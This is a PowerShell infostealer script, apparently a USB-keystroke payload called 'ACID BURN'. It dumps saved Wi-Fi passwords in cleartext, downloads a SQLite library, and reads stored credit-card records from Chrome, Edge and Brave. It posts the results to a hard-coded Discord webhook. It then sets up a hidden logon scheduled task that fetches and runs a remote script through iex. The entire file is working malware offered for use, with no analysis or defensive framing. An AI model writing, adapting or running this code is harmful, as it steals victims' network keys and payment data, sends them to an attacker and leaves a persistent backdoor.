try {
    $out = "$env:TEMP\wifi_dump.txt"
    "=== ACID BURN ===" | Out-File $out
    "Host: $env:COMPUTERNAME" | Out-File $out -Append
    "User: $env:USERNAME" | Out-File $out -Append
    "Time: $(Get-Date)" | Out-File $out -Append
    "" | Out-File $out -Append

    # --- SAVED WIFI ---
    "--- SAVED WIFI ---" | Out-File $out -Append
    try {
        $profiles = (netsh wlan show profiles) | Select-String "All User Profile" | ForEach-Object {
            ($_ -split ":")[1].Trim()
        }
        foreach ($p in $profiles) {
            $detail = netsh wlan show profile name="$p" key=clear
            $key = ($detail | Select-String "Key Content") -replace ".*:\s*", ""
            "$p : $key" | Out-File $out -Append
        }
    } catch { "wifi error: $_" | Out-File $out -Append }
    "" | Out-File $out -Append

    # --- SQLITE LOAD ---
    $sqliteDll = "$env:TEMP\System.Data.SQLite.dll"
    if (-not (Test-Path $sqliteDll)) {
        try { Invoke-WebRequest "https://raw.githubusercontent.com/stargosg/Ducky/refs/heads/main/System.Data.SQLite.dll" -OutFile $sqliteDll -UseBasicParsing } catch { }
    }
    $sqliteLoaded = $false
    if (Test-Path $sqliteDll) {
        try {
            [System.Reflection.Assembly]::LoadFrom($sqliteDll) | Out-Null
            $sqliteLoaded = $true
        } catch { }
    }

    # --- BROWSER CARDS ---
    "--- SAVED CARDS ---" | Out-File $out -Append

    $browsers = @{
        "Chrome" = "$env:LOCALAPPDATA\Google\Chrome\User Data"
        "Edge"   = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
        "Brave"  = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"
    }

    foreach ($b in $browsers.Keys) {
        $base = $browsers[$b]
        if (-not (Test-Path $base)) { continue }
        "== $b ==" | Out-File $out -Append

        $profilesDir = Get-ChildItem $base -Directory | Where-Object { $_.Name -match "^(Default|Profile)" }
        foreach ($pd in $profilesDir) {
            $webDb = Join-Path $pd.FullName "Web Data"
            if (-not (Test-Path $webDb)) { continue }
            "  [profile: $($pd.Name)]" | Out-File $out -Append

            $tmp = "$env:TEMP\ab_web_$($b)_$($pd.Name).db"
            Copy-Item $webDb $tmp -Force

            if (-not $sqliteLoaded) {
                "    SQLite DLL not loaded" | Out-File $out -Append
                continue
            }

            try {
                $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$tmp")
                $conn.Open()
                $cmd = $conn.CreateCommand()

                foreach ($tbl in @("credit_cards","masked_credit_cards")) {
                    try {
                        $cmd.CommandText = "SELECT COUNT(*) FROM $tbl"
                        $n = $cmd.ExecuteScalar()
                        "    [$tbl] $n rows" | Out-File $out -Append
                        if ($n -gt 0) {
                            if ($tbl -eq "credit_cards") {
                                $cmd.CommandText = "SELECT name_on_card, expiration_month, expiration_year FROM credit_cards"
                            } else {
                                $cmd.CommandText = "SELECT nickname, name_on_card, last_four, exp_month, exp_year FROM masked_credit_cards"
                            }
                            $r = $cmd.ExecuteReader()
                            while ($r.Read()) {
                                $vals = @()
                                for ($i = 0; $i -lt $r.FieldCount; $i++) { $vals += "$($r.GetValue($i))" }
                                "      $($vals -join ' | ')" | Out-File $out -Append
                            }
                            $r.Close()
                        }
                    } catch { "    [$tbl] error: $_" | Out-File $out -Append }
                }
                $conn.Close()
            } catch { "    db error: $_" | Out-File $out -Append }

            Remove-Item $tmp -Force -ErrorAction SilentlyContinue
        }
        "" | Out-File $out -Append
    }

    # --- EXFIL ---
    $body = Get-Content $out -Raw
    if ([string]::IsNullOrWhiteSpace($body)) { $body = "(empty)" }
    $body = $body -replace "\\", "/"
    if ($body.Length -gt 1900) { $body = $body.Substring(0, 1900) }

    $url = "https://discord.com/api/webhooks/1519137397022130196/X1Pyzeu-cYDoWXpEb5Evo9KFNKgpoeOhdLEsS9NbLWy5gvKkvqeqOZlxuCQV92Xi5XYT"
    $payload = @{ content = $body } | ConvertTo-Json -Compress
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($payload)
    Invoke-RestMethod -Uri $url -Method Post -Body $bytes -ContentType "application/json; charset=utf-8"

    # --- PERSISTENCE ---
    $pcmd = "powershell -w hidden -ep bypass -c `"iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/stargosg/Ducky/refs/heads/main/x.ps1')`""
    schtasks /create /tn "AcidBurn" /tr $pcmd /sc onlogon /f 2>$null
}
catch {
    $_ | Out-File "$env:TEMP\ab_error.txt"
}
